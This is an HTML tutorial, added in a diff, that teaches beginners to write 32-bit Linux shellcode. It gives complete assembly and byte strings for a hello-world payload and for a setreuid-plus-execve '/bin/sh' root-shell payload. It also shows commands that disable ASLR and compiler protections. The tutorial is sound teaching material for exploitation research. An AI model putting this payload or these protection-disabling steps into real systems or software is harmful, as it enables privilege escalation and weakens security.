@@ -1,0 +1,354 @@
+<html>
+<head>
+
+</head>
+<body>
+
+  <div style="text-align: center;">
+    <h1><b>Shellcode in Modern OSs</b></h1>
+    <p>
+      A brief introduction of shellcode creation for beginners in Modern OSs which have numerous protections to prevent illegal/malicious code execution attempts. 32-bit executable will be used for experimental & educational purposes.
+    </p>
+    <p>2018/07/25</p>
+  </div>
+
+  <h2>0. Introduction</h2>
+
+  <p>
+    One of the best ways to study the systems would be to create a snippet of code that can be executed independently in multiple contexts since it shows a clear picture of how the system behaves at an atomic instruction. One can do the same thing with a normal compilation process to the machine code from a higher level language (e.g., C), but usually this executable contains too much information for educational purposes.
+  </p>
+
+  <p>
+    One way of this is to make shellcode. Wikipedia defines the shellcode "a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability". The problem is even though there are plenty of tutorials and How Tos online, not many of them describe how to make experiments in OSs (usually Linux) that have protections to prevent shellcode execution. For beginners and researchers it is a roadblock because without disabling those features, it doesn't work.
+  </p>
+
+  <p>
+    Therefore, the objective of this tutorial is to guide the reader through the entire process of shellcode experiments from A to Z, pressing major points of the subject. In order to follow the tutorial, you need to have basic knowledge of Assembly Language, C, Linux, and general OS concepts. Let's begin!
+  </p>
+
+  <p>
+    DISCLAIMER: This simulated 32-bit environment and code are only for educational & research purposes, not for the real-world applications and exploitation. If you know enough and serious about real-world situations, please find information about 64-bit or architecture specific shellcode creation. Using shellcode highly depends on the specific architecture of the computing environment.
+  </p>
+
+  <h2>1. Preparation</h2>
+
+  <h3>1.1. Environments</h3>
+
+  <p>The following requirements should be prepared. However, I won't describe the steps since the installation details can be searched easily:</p>
+
+  <ul>
+    <li>Kali Linux 64 bit Version 2018.2 (Virtual machines are okay.)</li>
+    <li>gcc</li>
+    <li>ld</li>
+    <li>nasm</li>
+    <li>objdump</li>
+    <li>strace (Kali doesn't have it by default, you need to install it.)</li>
+    <li>Python3</li>
+  </ul>
+
+  <h3>1.2. Disable Protection Features</h3>
+
+  <h4>1.2.1. Disable Address Space Layout Randomization (ASLR)</h4>
+
+  <p>
+    Static memory manipulation is a popular attack for executing malicious code inside of the program since the attacker knows where to jump the program counter. However, if the address space layout is dynamic, at least this attack becomes harder (not impossible though). Many modern operating systems provide ASLR to randomize the address space layout, so we need to disable it. Type following command:
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ echo 0 | tee /proc/sys/kernel/randomize_va_space
+</code></pre>
+
+  <h4>1.2.2. nasm & ld Flags</h4>
+
+  <p>
+    All the assembly code in this tutorial, the following two commands will be used. See the flags carefully. Most x86-64 systems support compatibility mode for 32-bit executables, so there would be no problem with using 32-bit compilation.
+  </p>
+
+  <p>
+    The following command will create filename.o from the assembly code:
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ nasm -f elf [filename.asm] -o [filename.o]
+</code></pre>
+
+  <p>
+    The following command will create the executable from the object file.
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ ld -m elf_i386 -N [filename.o] -o [filename]
+</code></pre>
+
+  <h4>1.2.3. gcc Flags</h4>
+
+  <p>
+    After extracting the shellcode from the step above, we need to test whether it can be executed from inside of a normal executable. See the section 1.3. first to see what program we are going to use to achieve that. When we compile this code, we need to tell the compiler the following three things to work smoothly.
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ gcc [filename.c] -z execstack -fno-stack-protector -no-pie -o [filename]
+</code></pre>
+
+  <p>
+    First, -z is the flag for the linker. "execstack" is a directive for the linker that the program needs to be executed in stack. Without this option, the vector program won't work because the code inside of the char array will be in the stack.
+  </p>
+
+  <p>
+    Second, -fno-stack-protector disables the protection for buffer overflows. It unnecessary for this tutorial, but necessary for experiments that use buffer overflows to execute shellcode.
+  </p>
+
+  <p>
+    Finally, -no-pie disables Position Independent Executables (PIE). Many Linux systems compile C code as PIE by default, which means the executable will be a shared object. It moves the address space to somewhere, messing up the execution we intend. Therefore, we need to disable it, or segfault happens.
+  </p>
+
+  <p>
+    There are other flags related to the compiling, linking, and execution. You have to see the manuals carefully because sometimes man page doesn't say all the things about it. Use various sources for the information.
+  </p>
+
+  <h3>1.3. Write Shellcode Vector</h3>
+
+  <p>
+    The following is the code we use as a vector of shellcode. The machine code should be placed in the char array with "\x" attached in front of each machine code. See the example in the code.
+  </p>
+
+  <pre><code class="language-c">/* shellcode.c */
+char code[] = "\x01\x02\x03\x04...";
+int main(int argc, char **argv) {
+  int (*exeshell) ();
+  exeshell = (int (*) ())code;
+  (int)(*exeshell)();
+}
+</code></pre>
+
+  <p>
+    Now we are all set! Let's see some examples to see the environment is working. Please refer to the other tutorials for details since they explained very well. See the reference sections to get more information. Again, the main objective of this tutorial is to prepare the experimental & educational environment where we can experiment with protection features.
+  </p>
+
+  <h2>2. Hello World in Shellcode</h2>
+
+  <h3>2.1. Assembly Programming</h3>
+
+  <p>
+    Open a text editor, and type the code below.
+  </p>
+
+  <pre><code class="language-nasm">; helloworld.asm
+[SECTION .text]
+global _start
+_start:
+        jmp short ender
+
+        starter:
+                xor eax, eax ; Zero out eax.
+                xor ebx, ebx ; Zero out ebx.
+                xor edx, edx ; Zero out edx.
+                xor ecx, ecx ; Zero out ecx.
+                mov al, 4 ; Write syscall.
+                mov bl, 1 ; Port to send (stdout is 0).
+                pop ecx ; Get the address of the string from the call "ender".
+                mov dl, 12 ; String length.
+                int 0x80 ; Interrupt.
+                xor eax, eax ; Zero out eax.
+                mov al, 1 ; Exit.
+                xor ebx,ebx ; Zero out ebx.
+                int 0x80 ; Interrupt.
+        ender:
+                call starter ; Put the address of the string on the stack.
+                db 'Hello World!' ; Actual string located here.
+</code></pre>
+
+  <p>
+    Let's compile the assembly code and try to execute it. It should print out "Hello World!". Type the following commands:
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ nasm -f elf helloworld.asm -o helloworld.o
+[user@host] $ ld -m elf_i386 -N helloworld.o -o helloworld
+[user@host] $ ./helloworld
+</code></pre>
+
+  <h3>2.2. Machine Code Extraction</h3>
+
+  <p>
+    Let's see inside of the executable we just created. Type the following, then you will see the image below:
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ objdump -d helloworld
+</code></pre>
+
+  <figure>
+    <img src="img00.jpg" alt="Machine Code of helloworld.asm" width="80%">
+    <figcaption>Machine Code of helloworld.asm</figcaption>
+  </figure>
+
+  <p>
+    Basically what you have to do is to extract all the machine code written left side of the screen because those are the one actually transferred to CPU and make it do something meaningful. When you extract it to the vector code, "\x" should be put in front of every machine code. See the example in the next section. Use the following command
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ for i in `objdump  -d helloworld | grep "^ " | cut -f2`; do echo -n '\x'$i; done; echo
+</code></pre>
+
+  <h3>2.3. Execution</h3>
+
+  <pre><code class="language-c">/* shellcode.c */
+char code[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21";
+int main(int argc, char **argv) {
+  int (*exeshell) ();
+  exeshell = (int (*) ())code;
+  (int)(*exeshell)();
+}
+</code></pre>
+
+  <p>
+    Now we need to compile it with three flags we have seen before. Type the following commands and see if it works.
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ gcc shellcode.c -z execstack -fno-stack-protector -no-pie -o shellcode
+[user@host] $ ./shellcode
+</code></pre>
+
+  <p>
+    Yay! it's working right? So this is a good starting point where you can experiment with fewer flags. For example, how can you still execute the shellcode when you can't use the stack of the main program (take off -z execstack flag for this experiment)? Well, I will let you have all the fun. Before finishing the tutorial, let's check we can also execute the most crucial syscall "execve".
+  </p>
+
+  <h2>3. Root Shell in Shellcode</h2>
+
+  <h3>3.1. Assembly Programming</h3>
+
+  <p>
+    Open a text editor, and type the code below.
+  </p>
+
+  <pre><code class="language-nasm">; rootshell.asm
+[SECTION .text]
+global _start
+_start:
+        xor eax, eax ; Zero out eax.
+        mov al, 70 ; Set setreuid syscall.
+        xor ebx, ebx ; Zero out ebx.
+        xor ecx, ecx ; Zero out ecx.
+        int 0x80 ; Interrupt.
+
+        jmp short ender
+
+        starter:
+                pop ebx ; Get the address of the string from the caller.
+                xor eax, eax ; Zero out eax.
+
+                mov [ebx + 7], al ; Put a null in the end of the string.
+                mov [ebx + 8], ebx ; Put the address of the string to AAAA.
+                mov [ebx + 12], eax ; Put a null pointer to BBBB.
+                mov al, 11 ; Set execve syscall.
+
+                lea ecx, [ebx + 8] ; First argument of execve syscall.
+                lea edx, [ebx + 12] ; Second argument of execve syscall.
+                int 0x80 ; Interrupt.
+        ender:
+                call starter
+                db '/bin/shNAAAABBBB'
+</code></pre>
+
+  <p>
+    Let's compile the assembly code and try to execute it. It should open up a new shell. Type the following commands:
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ nasm -f elf rootshell.asm -o rootshell.o
+[user@host] $ ld -m elf_i386 -N rootshell.o -o rootshell
+[user@host] $ ./rootshell
+</code></pre>
+
+  <h3>3.2. Machine Code Extraction</h3>
+
+  <p>
+    Let's see inside of the executable. Type the following, then you will see the image below:
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ objdump -d rootshell
+</code></pre>
+
+  <figure>
+    <img src="img01.jpg" alt="Machine Code of rootshell.asm" width="80%">
+    <figcaption>Machine Code of rootshell.asm</figcaption>
+  </figure>
+
+  <p>
+    Extract the machine code, then put it into the vector code.
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ for i in `objdump  -d rootshell | grep "^ " | cut -f2`; do echo -n '\x'$i; done; echo
+</code></pre>
+
+  <h3>3.3. Execution</h3>
+
+  <pre><code class="language-c">/* shellcode.c */
+char code[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42";
+int main(int argc, char **argv) {
+  int (*exeshell) ();
+  exeshell = (int (*) ())code;
+  (int)(*exeshell)();
+}
+</code></pre>
+
+  <p>
+    Now we need to compile it. Type the following commands and see if it works. You should see something like the image below.
+  </p>
+
+  <pre><code class="language-bash">[user@host] $ gcc shellcode.c -z execstack -fno-stack-protector -no-pie -o shellcode
+[user@host] $ ./shellcode
+</code></pre>
+
+  <figure>
+    <img src="img02.jpg" alt="Root Shell" width="50%">
+    <figcaption>Root Shell</figcaption>
+  </figure>
+
+  <p>
+    It's cool, isn't it? Okay, you might think this is easy. You won't tell the same thing if you were to see the notorious "segmentation fault" without any error messages having to search the Internet for several days to see what's going on. If you are an expert, probably you won't need to see this tutorial, so I suppose my perspective is quite valid...
+  </p>
+
+  <h2>0. Conclusion</h2>
+
+  <p>
+    IT industries change too fast. All the versions, branches, sub-projects, and dependencies make people crazy. This is worse for the people who want to learn some real things in the field (I am not talking about "Hello World" in C). There are some books explaining the environments, but it quickly gets outdated.
+  </p>
+
+  <p>
+    Yes, technically you can still get the old RedHat 7.0 to experiment this, but there are many limitations. Most of all, that's not the system currently being used. So when you expand your knowledge to the real world from what you learned so far, you simply can't upgrade them and maintain the same environment. Also, you need to install other programs helpful for productivity or additional learning. You can't do that to the old system. I couldn't even install nasm in the old RedHat 7.0. There are other disadvantages as well, you name it.
+  </p>
+
+  <p>
+    I hope this article can put the firm ground for the beginners and researchers so they don't have to waste time like I had to. I will keep investigating, and extend this tutorial to more advanced topics in the future. Thank you very much for reading.
+  </p>
+
+  <h2>Appendix A. References</h2>
+
+  <p>
+    Wikipedia, "Shellcode" 2018. [Online]. Available:https://en.wikipedia.org/wiki/Shellcode. [Accessed July 25, 2018].
+  </p>
+
+  <p>
+    Wikipedia, "Position-independent code" 2018. [Online]. Available:https://en.wikipedia.org/wiki/Position-independent_code. [Accessed July 25, 2018].
+  </p>
+
+  <p>
+    Offensive Security, "Kali Linux" 2018. [Online]. Available:https://www.kali.org/. [Accessed July 25, 2018].
+  </p>
+
+  <p>
+    Steve Hanna, "Shellcoding for Linux and Windows Tutorial" 2004. [Online]. Available:http://www.vividmachines.com/shellcode/shellcode.html. [Accessed July 25, 2018].
+  </p>
+
+  <p>
+    zillion, "Writing Shellcode" 2002. [Online]. Available:http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html. [Accessed July 25, 2018].
+  </p>
+
+  <p>
+    Gary L. Burt, "Linux System Call Table" 2004. [Online]. Available:http://shell-storm.org/shellcode/files/syscalls.html. [Accessed July 25, 2018].
+  </p>
+
+  <p>
+    Ryan A. Chapman, "LINUX SYSTEM CALL TABLE FOR X86-64" 2012. [Online]. Available:http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/. [Accessed July 25, 2018].
+  </p>
+
+  <p>
+    GNU.org, "GCC: Options for Linking" N/A. [Online]. Available:https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html. [Accessed July 25, 2018].
+  </p>
+
+</body>
+</html>
